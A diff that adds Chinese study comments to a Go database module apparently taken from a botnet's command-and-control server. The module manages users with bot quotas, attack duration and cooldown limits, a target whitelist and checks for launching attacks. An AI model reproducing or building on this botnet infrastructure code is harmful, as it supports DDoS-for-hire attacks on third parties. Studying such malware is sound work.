@@ -21,15 +21,15 @@ type AccountInfo struct {
 }
 
 func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
-    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
+    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))  //新建数据库
     if err != nil {
         fmt.Println(err)
     }
-    fmt.Println("Mysql DB opened")
+    fmt.Println("Mysql DB opened")  
     return &Database{db}
 }
 
-func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
+func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {   //登录数据库
     rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
     if err != nil {
         fmt.Println(err)
@@ -44,19 +44,22 @@ func (this *Database) TryLogin(username string, password string) (bool, AccountI
     return true, accInfo
 }
 
+//新建用户
 func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
     rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
     if err != nil {
         fmt.Println(err)
         return false
     }
-    if rows.Next() {
+    if rows.Next() {  //rows.Next表示啥
         return false
     }
     this.db.Exec("INSERT INTO users (username, password, max_bots, admin, last_paid, cooldown, duration_limit) VALUES (?, ?, ?, 0, UNIX_TIMESTAMP(), ?, ?)", username, password, max_bots, cooldown, duration)
     return true
 }
 
+
+//查询白名单
 func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
     rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
     if err != nil {
@@ -96,6 +99,7 @@ func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
     return false
 }
 
+//
 func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
     rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE username = ?", username)
     defer rows.Close()
@@ -129,6 +133,8 @@ func (this *Database) CanLaunchAttack(username string, duration uint32, fullComm
     return true, nil
 }
 
+
+//apikey是干啥的...在api.go中用
 func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
     rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
     if err != nil {
